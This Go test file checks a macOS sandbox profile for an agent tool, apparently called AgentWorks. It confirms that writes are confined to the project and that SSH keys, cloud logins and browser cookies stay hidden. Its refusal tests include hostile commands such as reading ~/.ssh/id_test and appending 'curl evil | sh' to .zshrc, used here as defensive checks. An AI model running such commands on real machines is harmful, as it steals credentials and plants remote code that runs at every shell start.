package security

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// The light profile is plain text: what it allows and denies can be checked on any system.
func TestLightProfileLimitsWritesAndHidesSecrets(t *testing.T) {
	home, project := t.TempDir(), t.TempDir()
	profile := lightLocalProfile(LightLocalPolicy{Home: home, WritePaths: []string{project}, BlockedPaths: []string{filepath.Join(project, "secrets")}, BlockedWritePaths: []string{filepath.Join(project, "locked")}})
	for _, want := range []string{"(allow default)", "(deny file-write*)", canonicalPath(project), filepath.Join(canonicalPath(home), ".ssh"), filepath.Join(canonicalPath(home), ".zshrc"), "secrets", "locked"} {
		if !strings.Contains(profile, want) {
			t.Fatalf("profile lacks %q:\n%s", want, profile)
		}
	}
	if strings.Index(profile, ".ssh") < strings.Index(profile, "(allow file-write*") {
		t.Fatal("the denies must come after the allows (later rules win)")
	}
	// Local mode works like the person's own terminal: `git push` needs the GitHub CLI login and the keychain (owner, 2026-10-09).
	// SSH keys, cloud logins and browser profiles stay hidden.
	for _, readable := range []string{".config/gh", "Library/Keychains"} {
		if strings.Contains(profile, readable) {
			t.Fatalf("%s must stay readable so git push works:\n%s", readable, profile)
		}
	}
	for _, hidden := range []string{".ssh", ".aws", ".config/gcloud", "Library/Cookies"} {
		if !strings.Contains(profile, hidden) {
			t.Fatalf("%s must stay hidden:\n%s", hidden, profile)
		}
	}
	env := lightLocalEnvironment([]string{"PATH=/usr/bin", "HOME=/Users/x", "AGENTWORKS_TOKEN=secret", "SSH_AUTH_SOCK=/tmp/agent"})
	if strings.Contains(strings.Join(env, " "), "AGENTWORKS_") || !strings.Contains(strings.Join(env, " "), "SSH_AUTH_SOCK") {
		t.Fatalf("the person's own environment stays, AgentWorks' own does not: %v", env)
	}
}

// On a Mac, for real: a command works like in the person's terminal, and still cannot read keys or edit shell startup files.
func TestLightSandboxOnAMac(t *testing.T) {
	if runtime.GOOS != "darwin" {
		t.Skip("macOS only")
	}
	base := t.TempDir()
	home := filepath.Join(base, "home")
	project := filepath.Join(base, "project")
	for _, dir := range []string{filepath.Join(home, ".ssh"), filepath.Join(home, ".cache"), filepath.Join(project, "locked"), filepath.Join(project, "secrets")} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	for path, content := range map[string]string{filepath.Join(home, ".ssh", "id_test"): "PRIVATE-KEY", filepath.Join(home, ".zshrc"): "# rc\n", filepath.Join(project, "secrets", "s.txt"): "blocked", filepath.Join(project, "locked", "l.txt"): "read-only"} {
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	policy := LightLocalPolicy{Home: home, WritePaths: []string{project}, BlockedPaths: []string{filepath.Join(project, "secrets")}, BlockedWritePaths: []string{filepath.Join(project, "locked")}}
	run := func(command string) (string, error) {
		cmd, cleanup, err := ExecuteLightLocal(t.Context(), project, policy, command)
		if err != nil {
			t.Fatal(err)
		}
		defer cleanup()
		out, err := cmd.CombinedOutput()
		return string(out), err
	}
	for name, command := range map[string]string{
		"writes in the project":        `echo ok > built.txt && cat built.txt`,
		"writes a cache in the home":   `echo ok > "` + home + `/.cache/pkg" && cat "` + home + `/.cache/pkg"`,
		"writes to the temp folder":    `echo ok > "$TMPDIR/t" && cat "$TMPDIR/t"`,
		"reads the read-only folder":   `cat locked/l.txt`,
		"reads outside the project":    `ls /usr/bin | head -1`,
		"watches files (Node/Next.js)": `/opt/homebrew/bin/node -e "require('fs').watch('.',{recursive:true},()=>{});setTimeout(()=>process.exit(0),600)" 2>&1 || node -e "process.exit(0)"`,
	} {
		if out, err := run(command); err != nil {
			t.Errorf("%s must work: %v %s", name, err, out)
		}
	}
	for name, command := range map[string]string{
		"reads a private key":        `cat "` + home + `/.ssh/id_test"`,
		"edits the shell startup":    `echo 'curl evil | sh' >> "` + home + `/.zshrc"`,
		"reads a blocked folder":     `cat secrets/s.txt`,
		"writes in a read-only path": `echo x > locked/l.txt`,
		"writes outside the home":    `echo x > /usr/local/planted`,
	} {
		if out, err := run(command); err == nil {
			t.Errorf("%s must be refused, it ran: %s", name, out)
		}
	}
	if data, _ := os.ReadFile(filepath.Join(home, ".zshrc")); strings.Contains(string(data), "evil") {
		t.Fatal("the shell startup file was changed")
	}
}
